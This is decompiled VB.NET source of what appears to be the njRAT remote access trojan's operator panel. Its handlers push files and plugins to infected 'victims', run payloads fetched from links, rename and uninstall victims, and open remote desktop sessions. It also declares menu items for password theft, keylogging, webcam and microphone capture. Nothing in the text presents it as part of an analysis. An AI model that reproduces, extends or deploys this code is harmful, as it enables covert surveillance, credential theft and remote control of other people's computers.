		' Token: 0x060001F8 RID: 504 RVA: 0x00012C58 File Offset: 0x00010E58
		Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim thread As Thread = AddressOf Class7.smethod_4
			Dim thread2 As Thread = thread
			Dim array As Object() = New Object(1) {}
			Dim array2 As Object() = array
			Dim num As Integer = 0
			Dim text As String = "un" + Class7.string_1 + "!"
			array2(num) = Class6.smethod_11(text)
			array(1) = Me.L1.DefaultCellStyle.ForeColor
			thread2.Start(array)
		End Sub

		' Token: 0x060001F9 RID: 505 RVA: 0x00012624 File Offset: 0x00010824
		Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .FileName = String.Empty }
				If openFileDialog.ShowDialog() = DialogResult.OK Then
					Dim flag As Boolean = True
					Dim array As Byte() = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), flag)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = "rn" + Class7.string_1 + New FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + Class7.string_1
					memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x060001FA RID: 506 RVA: 0x00012CC0 File Offset: 0x00010EC0
		Private Sub FromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim furl As FURL = New FURL()
				furl.ShowDialog(Me)
				If furl.IsOK Then
					Dim text As String = String.Concat(New String() { "rn", Class7.string_1, furl.TextBox2.Text, Class7.string_1, furl.TextBox1.Text })
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { Class6.smethod_11(text), Color.Green })
				End If
			End If
		End Sub

		' Token: 0x060001FB RID: 507 RVA: 0x00012D7C File Offset: 0x00010F7C
		Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = Interaction.InputBox("Enter New Name", "Rename Victim", String.Empty, -1, -1)
			If text.Length > 0 Then
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Try
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "Send", New Object() { String.Concat(New String() { "prof", Class7.string_1, "~", Class7.string_1, "vn", Class7.string_1, Class6.smethod_14(text) }) }, Nothing, Nothing, Nothing, True)
							dataGridViewRow.Cells(Class7.int_0).Value = text + "_" + Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(dataGridViewRow.Cells(Class7.int_0).Value)), "_", -1, CompareMethod.Binary)(Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(dataGridViewRow.Cells(Class7.int_0).Value)), "_", -1, CompareMethod.Binary).Length - 1)
						Catch ex As Exception
						End Try
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x060001FC RID: 508 RVA: 0x00002B6E File Offset: 0x00000D6E
		Private Sub ToolStripStatusLabel3_Click(sender As Object, e As EventArgs)
			MyProject.Forms.Builder.ShowDialog()
		End Sub

		' Token: 0x060001FD RID: 509 RVA: 0x00012F38 File Offset: 0x00011138
		Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("sc2.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x060001FE RID: 510 RVA: 0x00012FCC File Offset: 0x000111CC
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Me.int_0 += 1
				If Me.int_0 = 10 Then
					Me.int_0 = 0
					Me.upl.Text = "Upload [" + Class6.smethod_17(Class7.long_0) + "]"
					Me.dwn.Text = "Download [" + Class6.smethod_17(Class7.long_1) + "]"
					Class7.long_0 = 0L
					Class7.long_1 = 0L
				End If
				Me.Text = String.Concat(New String() { Class7.string_0, "    Port[ ", Conversions.ToString(Me.port), " ]    Online[ ", Conversions.ToString(Me.L1.RowCount), " ]    Selected[", Conversions.ToString(Me.L1.SelectedRows.Count), "] REQ[", Conversions.ToString(Me.S.REQ.Count), "]" })
				Me.conz.Text = "Connections[" + Conversions.ToString(Me.S.Online.Count) + "]"
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060001FF RID: 511 RVA: 0x00002B80 File Offset: 0x00000D80
		Private Sub ToolStripStatusLabel2_Click(sender As Object, e As EventArgs)
			MyProject.Forms.Downloader.Show()
		End Sub

		' Token: 0x06000200 RID: 512 RVA: 0x00002B91 File Offset: 0x00000D91
		Private Sub ToolStripStatusLabel6_Click(sender As Object, e As EventArgs)
			MyProject.Forms.Tools.Show()
		End Sub

		' Token: 0x06000201 RID: 513 RVA: 0x00002BA2 File Offset: 0x00000DA2
		Private Sub ToolStripStatusLabel7_Click(sender As Object, e As EventArgs)
			MyProject.Forms.anti.Show()
		End Sub

		' Token: 0x06000202 RID: 514 RVA: 0x00013150 File Offset: 0x00011350
		Private Sub EnableToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
				openFileDialog.FileName = String.Empty
				File.Copy("Plugin/AntiProcess.dll", Path.GetTempPath() + "\Anti.exe")
				Dim flag As Boolean = True
				Dim array As Byte() = Class6.smethod_8(File.ReadAllBytes(Path.GetTempPath() + "\Anti.exe"), flag)
				Dim memoryStream As MemoryStream = New MemoryStream()
				Dim text As String = "rn" + Class7.string_1 + New FileInfo(Path.GetTempPath() + "\Anti.exe").Extension.Remove(0, 1) + Class7.string_1
				memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
				memoryStream.Write(array, 0, array.Length)
				Dim thread As Thread = AddressOf Class7.smethod_4
				thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				File.Delete(Path.GetTempPath() + "\Anti.exe")
			End If
		End Sub

		' Token: 0x06000203 RID: 515 RVA: 0x00013278 File Offset: 0x00011478
		Private Sub SendPluginToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .FileName = String.Empty }
				If openFileDialog.ShowDialog() = DialogResult.OK Then
					File.Copy(openFileDialog.FileName, Path.GetTempPath() + "\SendPlugin.exe")
					Dim flag As Boolean = True
					Dim array As Byte() = Class6.smethod_8(File.ReadAllBytes(Path.GetTempPath() + "\SendPlugin.exe"), flag)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = "     " + Class7.string_1 + New FileInfo(Path.GetTempPath() + "\SendPlugin.exe").Extension.Remove(0, 1) + Class7.string_1
					memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
					File.Delete(Path.GetTempPath() + "\SendPlugin.exe")
					Interaction.MsgBox("Successfully Send Plugin", MsgBoxStyle.Information, Nothing)
				End If
			End If
		End Sub

		' Token: 0x06000204 RID: 516 RVA: 0x000133C4 File Offset: 0x000115C4
		Private Sub OpenWebSiteFromHideToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag))), Nothing, "Send", New Object() { "site" }, Nothing, Nothing, Nothing, True)
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x06000205 RID: 517 RVA: 0x00013458 File Offset: 0x00011658
		Private Sub FunToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag))), Nothing, "Send", New Object() { "fun" }, Nothing, Nothing, Nothing, True)
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x06000206 RID: 518 RVA: 0x00002BB3 File Offset: 0x00000DB3
		Private Sub CoderToolStripMenuItem_Click(sender As Object, e As EventArgs)
			MyProject.Forms.About.Show()
		End Sub

		' Token: 0x040000B2 RID: 178
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040000B4 RID: 180
		<AccessedThroughProperty("StatusStrip1")>
		Private _StatusStrip1 As StatusStrip

		' Token: 0x040000B5 RID: 181
		<AccessedThroughProperty("ToolStripStatusLabel1")>
		Private _ToolStripStatusLabel1 As ToolStripStatusLabel

		' Token: 0x040000B6 RID: 182
		<AccessedThroughProperty("ToolStripStatusLabel3")>
		Private _ToolStripStatusLabel3 As ToolStripStatusLabel

		' Token: 0x040000B7 RID: 183
		<AccessedThroughProperty("ToolStripStatusLabel5")>
		Private _ToolStripStatusLabel5 As ToolStripStatusLabel

		' Token: 0x040000B8 RID: 184
		<AccessedThroughProperty("ToolStripStatusLabel4")>
		Private _ToolStripStatusLabel4 As ToolStripStatusLabel

		' Token: 0x040000B9 RID: 185
		<AccessedThroughProperty("conz")>
		Private _conz As ToolStripStatusLabel

		' Token: 0x040000BA RID: 186
		<AccessedThroughProperty("upl")>
		Private _upl As ToolStripStatusLabel

		' Token: 0x040000BB RID: 187
		<AccessedThroughProperty("dwn")>
		Private _dwn As ToolStripStatusLabel

		' Token: 0x040000BC RID: 188
		<AccessedThroughProperty("ContextMenuStrip1")>
		Private _ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x040000BD RID: 189
		<AccessedThroughProperty("ManagerToolStripMenuItem")>
		Private _ManagerToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000BE RID: 190
		<AccessedThroughProperty("RunFileToolStripMenuItem")>
		Private _RunFileToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000BF RID: 191
		<AccessedThroughProperty("FromLinkToolStripMenuItem")>
		Private _FromLinkToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C0 RID: 192
		<AccessedThroughProperty("FromDiskToolStripMenuItem")>
		Private _FromDiskToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C1 RID: 193
		<AccessedThroughProperty("ScriptToolStripMenuItem")>
		Private _ScriptToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C2 RID: 194
		<AccessedThroughProperty("RemoteDesktopToolStripMenuItem")>
		Private _RemoteDesktopToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C3 RID: 195
		<AccessedThroughProperty("RemoteCamToolStripMenuItem")>
		Private _RemoteCamToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C4 RID: 196
		<AccessedThroughProperty("MicrophoneToolStripMenuItem")>
		Private _MicrophoneToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C5 RID: 197
		<AccessedThroughProperty("GetPasswordsToolStripMenuItem")>
		Private _GetPasswordsToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C6 RID: 198
		<AccessedThroughProperty("KeyloggerToolStripMenuItem")>
		Private _KeyloggerToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C7 RID: 199
		<AccessedThroughProperty("OpenChatToolStripMenuItem")>
		Private _OpenChatToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C8 RID: 200
		<AccessedThroughProperty("ServerToolStripMenuItem")>
		Private _ServerToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C9 RID: 201
		<AccessedThroughProperty("UpdateToolStripMenuItem")>
		Private _UpdateToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000CA RID: 202
		<AccessedThroughProperty("FromDISKToolStripMenuItem1")>
		Private _FromDISKToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x040000CB RID: 203
		<AccessedThroughProperty("FromLINKToolStripMenuItem1")>
		Private _FromLINKToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x040000CC RID: 204
		<AccessedThroughProperty("UninstallToolStripMenuItem")>
		Private _UninstallToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000CD RID: 205
		<AccessedThroughProperty("RestartToolStripMenuItem")>
		Private _RestartToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000CE RID: 206
		<AccessedThroughProperty("CloseToolStripMenuItem")>
		Private _CloseToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000CF RID: 207
		<AccessedThroughProperty("DisconnectToolStripMenuItem")>
		Private _DisconnectToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D0 RID: 208
		<AccessedThroughProperty("RenameToolStripMenuItem")>
		Private _RenameToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D1 RID: 209
		<AccessedThroughProperty("OpenFolderToolStripMenuItem")>
		Private _OpenFolderToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D2 RID: 210
		<AccessedThroughProperty("IMG2")>
		Private _IMG2 As ImageList

		' Token: 0x040000D3 RID: 211
		<AccessedThroughProperty("Njrat")>
		Private _Njrat As NotifyIcon

		' Token: 0x040000D4 RID: 212
		<AccessedThroughProperty("L1")>
		Private _L1 As L1

		' Token: 0x040000D5 RID: 213
		<AccessedThroughProperty("Pp1")>
		Private _Pp1 As Pp1

		' Token: 0x040000D6 RID: 214
		<AccessedThroughProperty("ContextMenuStrip2")>
		Private _ContextMenuStrip2 As ContextMenuStrip

		' Token: 0x040000D7 RID: 215
		<AccessedThroughProperty("ShowToolStripMenuItem")>
		Private _ShowToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D8 RID: 216
		<AccessedThroughProperty("RestartToolStripMenuItem1")>
		Private _RestartToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x040000D9 RID: 217
		<AccessedThroughProperty("ExitToolStripMenuItem")>
		Private _ExitToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000DA RID: 218
		<AccessedThroughProperty("Timer1")>
		Private _Timer1 As System.Windows.Forms.Timer

		' Token: 0x040000DB RID: 219
		<AccessedThroughProperty("ToolStripStatusLabel2")>
		Private _ToolStripStatusLabel2 As ToolStripStatusLabel

		' Token: 0x040000DC RID: 220
		<AccessedThroughProperty("ToolStripStatusLabel6")>
		Private _ToolStripStatusLabel6 As ToolStripStatusLabel

		' Token: 0x040000DD RID: 221
		<AccessedThroughProperty("ToolStripStatusLabel7")>
		Private _ToolStripStatusLabel7 As ToolStripStatusLabel

		' Token: 0x040000DE RID: 222
		<AccessedThroughProperty("FunToolStripMenuItem")>
		Private _FunToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000DF RID: 223
		<AccessedThroughProperty("AntiProcessToolStripMenuItem")>
		Private _AntiProcessToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000E0 RID: 224
		<AccessedThroughProperty("EnableToolStripMenuItem")>
		Private _EnableToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000E1 RID: 225
		<AccessedThroughProperty("SendPluginToolStripMenuItem")>
		Private _SendPluginToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000E2 RID: 226
		<AccessedThroughProperty("OpenWebSiteFromHideToolStripMenuItem")>
		Private _OpenWebSiteFromHideToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000E3 RID: 227
		<AccessedThroughProperty("CoderToolStripMenuItem")>
		Private _CoderToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000E4 RID: 228
		Private int_0 As Integer

		' Token: 0x040000E5 RID: 229
		Public isActive As Boolean

		' Token: 0x040000E6 RID: 230
		Public port As Integer

		' Token: 0x040000E7 RID: 231
		Public S As SK

		' Token: 0x040000E8 RID: 232
		Public Yy As Object
	End Class
End Namespace
